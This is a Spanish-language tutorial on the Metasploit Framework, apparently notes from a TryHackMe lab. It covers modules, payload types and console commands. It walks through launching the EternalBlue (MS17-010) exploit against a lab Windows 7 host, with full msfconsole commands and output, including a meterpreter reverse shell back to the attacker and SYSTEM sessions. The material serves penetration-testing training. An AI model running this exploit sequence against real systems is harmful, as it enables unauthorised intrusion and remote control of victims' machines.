# Metasploit Framework

## Versiones Principales

Metasploit tiene dos versiones principales:

- **Metasploit Pro**: La versión comercial que facilita la automatización y gestión de tareas, con una interfaz gráfica de usuario (GUI).
- **Metasploit Framework**: La versión de código abierto que se utiliza desde la línea de comandos. Es la más común en distribuciones de Linux orientadas a pruebas de penetración y es la que se abordará en esta guía.

El **Metasploit Framework** es una colección de herramientas que permiten la recolección de información, escaneo, explotación, desarrollo de exploits, post-explotación y mucho más. Aunque su uso principal se enfoca en pruebas de penetración, también es útil para investigación de vulnerabilidades y desarrollo de exploits.

---

## Conceptos Básicos

Antes de explorar los módulos, es útil entender algunos conceptos clave:

- **Vulnerabilidad**: Un fallo de diseño, código o lógica en el sistema objetivo. La explotación de una vulnerabilidad puede resultar en la divulgación de información confidencial o en la ejecución de código en el sistema objetivo.
- **Exploit**: Código que aprovecha una vulnerabilidad en el sistema objetivo.
- **Payload**: El código que se ejecutará en el sistema objetivo tras la explotación de una vulnerabilidad, como ganar acceso al sistema o leer información confidencial.

---

## Módulos en Metasploit

1. **Auxiliary**: Complementa el proceso de explotación, incluyendo escaneos y ataques de fuerza bruta.
2. **Encoders**: Codifica el payload para evitar ser detectado por software de seguridad.
3. **Evasion**: Ayuda a evadir las defensas del sistema objetivo.
4. **Exploits**: Código que aprovecha una vulnerabilidad en el sistema objetivo.
5. **NOPs**: Instrucciones "No Operation" que llenan espacio y alinean el exploit.
6. **Payloads**: Existen varios tipos de payloads:
   - **Adapters**: Envolven payloads en diferentes formatos, como comandos de PowerShell.
   - **Singles**: Payloads independientes que no necesitan descargar componentes adicionales (por ejemplo, agregar un usuario o lanzar una aplicación).
   - **Stagers**: Establecen un canal de comunicación entre Metasploit y el sistema objetivo, permitiendo enviar payloads en etapas. El tamaño del payload inicial es más pequeño, lo cual ayuda a evitar la detección.
   - **Stages**: Payloads de mayor tamaño que se descargan y ejecutan tras establecerse la conexión inicial mediante el stager.
7. **Post**: Módulos utilizados después de la explotación para realizar acciones en el sistema comprometido.

---

## Comandos Principales

- **`use`**: Selecciona un módulo.
  - Ejemplo:
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```
- **`show options`**: Muestra las opciones disponibles para el módulo seleccionado.
- **`back`**: Regresa al menú anterior.
- **`info`**: Muestra información sobre el módulo actual.
- **`search`**: Busca un módulo específico.
  - La salida del comando `search` muestra una lista de módulos con información como el tipo (auxiliary, exploit, etc.) y la categoría (scanner, admin, windows, unix, etc.).
  - Puedes seleccionar cualquier módulo encontrado con el comando `use` seguido del número de la línea de resultado.
    - Ejemplo:
      ```bash
      use 0  # En lugar de usar "use auxiliary/admin/smb/ms17_010_command"
      ```

---

![Metasploit Modules](https://github.com/MC-19/Upgrade-Hub/blob/main/TryHackMe/Rooms/a88c8d37283878e01447853a68578deb.png)


## Tipos de Prompts en Metasploit

Al trabajar con Metasploit, es importante entender los diferentes tipos de prompts que encontrarás:

1. **Command Prompt Regular**: 
   - No puedes usar comandos de Metasploit aquí. Es el terminal estándar del sistema operativo.

2. **msfconsole Prompt**: 
   - Aparece como `msf6` (o `msf5` dependiendo de la versión instalada). En este prompt, no se establece un contexto específico, por lo que no puedes usar comandos específicos para establecer parámetros y ejecutar módulos.

3. **Context Prompt**: 
   - Una vez que decides usar un módulo y ejecutas el comando `set` para seleccionarlo, el prompt de `msfconsole` mostrará el contexto. Aquí puedes usar comandos específicos del contexto (por ejemplo, `set RHOSTS 10.10.x.x`).

4. **Meterpreter Prompt**: 
   - Meterpreter es un payload importante que se verá en detalle más adelante. Este prompt significa que un agente de Meterpreter se ha cargado en el sistema objetivo y se ha conectado de regreso a ti. Puedes usar comandos específicos de Meterpreter aquí.

5. **Shell en el Sistema Objetivo**: 
   - Una vez que se completa la explotación, puedes tener acceso a un shell de comandos en el sistema objetivo. Este es un comando regular, y todos los comandos escritos aquí se ejecutan en el sistema objetivo.

---

## Comando `show options`

El comando `show options` lista todos los parámetros disponibles para el módulo seleccionado. Aquí tienes un ejemplo del uso del comando en un módulo de explotación:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.44.70      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

# Uso de Metasploit para Explotar Vulnerabilidades

## Configuración de Parámetros del Módulo

Como se puede ver en la captura de pantalla anterior, algunos de estos parámetros requieren un valor para que el exploit funcione. Algunos valores de parámetros requeridos se pre-poblarán, asegúrate de verificar si deben permanecer igual para tu objetivo. Por ejemplo, un exploit web podría tener un valor de RPORT (puerto remoto: el puerto en el sistema objetivo al que Metasploit intentará conectarse y ejecutar el exploit) preestablecido en 80, pero tu aplicación web objetivo podría estar usando el puerto 8080.

```bash

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
rhosts => 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.165.39     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.44.70      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >

```

Los parámetros que usarás con frecuencia son:

- **RHOSTS**: “Host remoto”, la dirección IP del sistema objetivo. Se puede establecer una sola dirección IP o un rango de red. Esto soportará la notación CIDR (Classless Inter-Domain Routing) (/24, /16, etc.) o un rango de red (10.10.10.x – 10.10.10.y). También puedes usar un archivo donde se enumeran los objetivos, un objetivo por línea utilizando `file:/path/of/the/target_file.txt`, como se muestra a continuación.

- **RPORT**: “Puerto remoto”, el puerto en el sistema objetivo en el que se está ejecutando la aplicación vulnerable.

- **PAYLOAD**: La carga útil que utilizarás con el exploit.

- **LHOST**: “Localhost”, la dirección IP de la máquina atacante (tu AttackBox o Kali Linux).

- **LPORT**: “Puerto local”, el puerto que utilizarás para que la shell reversa se conecte de vuelta. Este es un puerto en tu máquina atacante, y puedes establecerlo en cualquier puerto que no esté siendo utilizado por otra aplicación.

- **SESSION**: Cada conexión establecida al sistema objetivo utilizando Metasploit tendrá un ID de sesión. Utilizarás esto con los módulos de post-explotación que se conectarán al sistema objetivo usando una conexión existente.

Puedes sobrescribir cualquier parámetro configurado usando el comando `set` nuevamente con un valor diferente. También puedes borrar cualquier valor de parámetro usando el comando `unset` o borrar todos los parámetros establecidos con el comando `unset all`. 

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
Flushing datastore...
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```


Puedes usar el comando `setg` para establecer valores que se usarán para todos los módulos. El comando `setg` se usa de la misma manera que el comando `set`. La diferencia es que si usas el comando `set` para establecer un valor usando un módulo y cambias a otro módulo, tendrás que establecer el valor nuevamente. El comando `setg` te permite establecer el valor para que se use por defecto en diferentes módulos. Puedes borrar cualquier valor establecido con `setg` usando `unsetg`.

El ejemplo a continuación usa el siguiente flujo:

1. Usamos el exploit `ms17_010_eternalblue`.
2. Establecemos la variable `RHOSTS` usando el comando `setg` en lugar del comando `set`.
3. Usamos el comando `back` para salir del contexto del exploit.
4. Usamos un módulo auxiliar (este módulo es un escáner para descubrir vulnerabilidades de MS17-010).
5. El comando `show options` muestra que el parámetro `RHOSTS` ya está poblado con la dirección IP del sistema objetivo.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
rhosts => 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                Required  Description
   ----         ---------------                                                --------  -----------
   CHECK_ARCH   true                                                           no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                           no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                          no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /opt/metasploit-framework-5101/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       10.10.165.39                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT        445                                                            yes       The SMB service port (TCP)
   SMBDomain    .                                                              no        The Windows domain to use for authentication
   SMBPass                                                                     no        The password for the specified username
   SMBUser                                                                     no        The username to authenticate as
   THREADS      1                                                              yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) >
```

El comando `setg` establece un valor global que se utilizará hasta que salgas de Metasploit o lo borres utilizando el comando `unsetg`.

## Uso de Módulos

Una vez que se hayan configurado todos los parámetros del módulo, puedes lanzar el módulo utilizando el comando `exploit`. Metasploit también admite el comando `run`, que es un alias creado para el comando `exploit`, ya que la palabra `exploit` no tiene sentido cuando se utilizan módulos que no son exploits (escaners de puertos, escáneres de vulnerabilidades, etc.).

El comando `exploit` se puede usar sin ningún parámetro o utilizando el parámetro “-z”.

El comando `exploit -z` ejecutará el exploit y enviará la sesión a segundo plano tan pronto como se abra. Esto te devolverá al aviso de contexto desde el que ejecutaste el exploit.


```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z

[*] Started reverse TCP handler on 10.10.44.70:4444 
[*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.12.229:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.12.229:445 - Connecting to target for exploitation.
[+] 10.10.12.229:445 - Connection established for exploitation.
[+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.12.229:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.12.229:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.12.229:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.12.229:445 - Sending all but last fragment of exploit packet
[*] 10.10.12.229:445 - Starting non-paged pool grooming
[+] 10.10.12.229:445 - Sending SMBv2 buffers
[+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.12.229:445 - Sending final SMBv2 buffers.
[*] 10.10.12.229:445 - Sending last fragment of exploit packet!
[*] 10.10.12.229:445 - Receiving response from exploit packet
[+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.12.229:445 - Sending egg to corrupted connection.
[*] 10.10.12.229:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.12.229
[*] Meterpreter session 2 opened (10.10.44.70:4444 -> 10.10.12.229:49186) at 2021-08-20 02:06:48 +0100
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Session 2 created in the background.
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

This will return you the context prompt from which you have run the exploit.

Algunos módulos admiten la opción `check`. Esto verificará si el sistema objetivo es vulnerable sin explotarlo.

## Sesiones

Una vez que se ha explotado con éxito una vulnerabilidad, se creará una sesión. Este es el canal de comunicación establecido entre el sistema objetivo y Metasploit.

Puedes usar el comando `background` para enviar la sesión a segundo plano y regresar al aviso de `msfconsole`.

```bash
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Alternativamente, se puede usar `CTRL+Z` para enviar sesiones a segundo plano.

El comando `sessions` se puede utilizar desde el aviso de `msfconsole` o cualquier contexto para ver las sesiones existentes.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > sessions 

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 >
```

Para interactuar con cualquier sesión, puedes usar el comando `sessions -i` seguido del número de sesión deseado.

```bash
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```
